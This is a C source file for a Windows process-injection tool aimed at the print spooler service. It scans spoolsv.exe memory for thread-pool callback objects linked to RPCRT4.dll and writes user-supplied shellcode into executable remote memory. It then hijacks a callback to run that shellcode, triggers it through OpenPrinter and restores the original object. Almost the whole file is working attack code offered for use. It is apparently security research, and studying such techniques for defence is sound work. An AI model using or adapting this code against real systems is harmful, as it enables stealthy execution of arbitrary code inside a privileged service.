/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

SIZE_T payloadSize;    // size of shellcode
LPVOID payload;        // local pointer to shellcode

// try inject and run payload in remote process using callback object
BOOL inject(HANDLE hp, LPVOID ds, PTP_CALLBACK_OBJECT tco) {
    LPVOID             cs = NULL;
    BOOL               bStatus = FALSE;
    TP_CALLBACK_OBJECT cpy;
    TP_SIMPLE_CALLBACK tp;
    SIZE_T             wr;
    HANDLE             phPrinter = NULL;
    
    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(hp, NULL, payloadSize + sizeof(TP_SIMPLE_CALLBACK), 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    if (cs != NULL) {
        // write payload to remote process
        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
        // backup original callback object
        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
        // copy original callback address and parameter
        tp.Function = cpy.Callback.Function;
        tp.Context  = cpy.Callback.Context;
        // write callback+parameter to remote process
        WriteProcessMemory(hp, (LPBYTE)cs + payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback.Function = cs;
        cpy.Callback.Context  = (LPBYTE)cs + payloadSize;
        // update callback object in remote process
        WriteProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        if(OpenPrinter(NULL, &phPrinter, NULL)) {
          ClosePrinter(phPrinter);
        }
        // read back the TCO
        ReadProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
        // restore the original tco
        WriteProcessMemory(hp, ds, tco, sizeof(cpy), &wr);
        // if callback pointer is the original, we succeeded.
        bStatus = (cpy.Callback.Function == tco->Callback.Function);
        // release memory for payload
        VirtualFreeEx(hp, cs, payloadSize, MEM_RELEASE);
    }
    return bStatus;
}
        
// validates a callback object
BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT tco) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // if it's a callback, these values shouldn't be empty  
    if(tco->CleanupGroupMember     == NULL ||
       tco->Pool                   == NULL ||
       tco->CallerAddress.Function == NULL ||
       tco->Callback.Function      == NULL) return FALSE;

    // the CleanupGroupMember should reside in read-only
    // area of image
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->CleanupGroupMember, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    if (!(mbi.Type & MEM_IMAGE)) return FALSE;
    
    // the pool object should reside in read+write memory
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->Pool, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READWRITE)) return FALSE;

    // the caller address  should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->CallerAddress.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
    
    // the callback function should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->Callback.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);    
}

// try to locate valid callback objects in remote process
BOOL FindCallback(HANDLE hProcess, 
  LPVOID BaseAddress, SIZE_T RegionSize) 
{
    LPBYTE             addr = (LPBYTE)BaseAddress;
    SIZE_T             pos;
    BOOL               bRead, bFound=FALSE;
    SIZE_T             rd;
    TP_CALLBACK_OBJECT tco;
    WCHAR              filename[MAX_PATH];
    
    // scan memory for TCO
    for(pos=0; pos<RegionSize; 
      pos += (bFound ? sizeof(tco) : sizeof(ULONG_PTR))) 
    {
      bFound = FALSE;
      // try read TCO from writeable memory
      bRead = ReadProcessMemory(hProcess,
        &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);

      // if not read, continue
      if(!bRead) continue;
      // if not size of callback environ, continue
      if(rd != sizeof(TP_CALLBACK_OBJECT)) continue;
      
      // is this a valid TCO?
      if(IsValidTCO(hProcess, &tco)) {
        // if this object resides in RPCRT4.dll, try use
        // it for process injection
        ZeroMemory(filename, ARRAYSIZE(filename));
        GetMappedFileName(hProcess, 
          (LPVOID)tco.Callback.Function, filename, MAX_PATH);

        if(StrStrI(filename, L"RPCRT4.dll") != NULL) {
          wprintf(L"Found TCO at %p for %s\n",  addr+pos, filename);
          // try run payload using this TCO
          // if successful, end scan
          bFound = inject(hProcess, addr+pos, &tco);
          if (bFound) break;
        }
      }
    }
    return bFound;
}

BOOL ScanProcess(DWORD pid) {
    HANDLE                   hProcess;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BOOL                     bInject=FALSE;
    
    // try locate the callback environ used for ALPC in print spooler
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // if process opened
    if (hProcess != NULL) {
      // get memory info
      GetSystemInfo(&si);
      
      for (addr=0; addr < (LPBYTE)si.lpMaximumApplicationAddress;) {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

        // we only want to scan the heap, but this will scan stack space too.
        // need to fix that..
        if ((mbi.State   == MEM_COMMIT)  &&
            (mbi.Type    == MEM_PRIVATE) && 
            (mbi.Protect == PAGE_READWRITE)) 
        {
          bInject=FindCallback(hProcess, mbi.BaseAddress, mbi.RegionSize);
          if(bInject) break;
        }
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
      }
      CloseHandle(hProcess);
    }
    return bInject;
}

int main(void) {
    PWCHAR             *argv;
    int                argc;
    DWORD              pid;
    TP_CALLBACK_OBJECT tco;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if (argc < 2) {
      wprintf(L"usage: spooler <payload>\n");
      return 0;
    }
    
    // try read pic
    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { 
      wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
      return 0; 
    }
      
    // if not elevated, display warning
    if(!IsElevated()) {
      wprintf(L"[-] WARNING: This requires elevated privileges!\n");
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)){
      wprintf(L"[-] Unable to enable debug privilege\n");
      return 0;
    }
    
    // get process id for spoolsv.exe service
    pid = name2pid(L"spoolsv.exe");
    if(pid==0)pid=_wtoi(argv[2]);
    
    if (pid == 0) {
      wprintf(L"unable to find pid for print spooler.\n");
      return 0;
    }
    
    wprintf(L"Scanning %i\n", pid);
    // locate viable callback object in spooler service
    wprintf(L"Spooler Injection : %s\n", 
      ScanProcess(pid) ? L"OK" : L"FAILED");
    return 0;
}

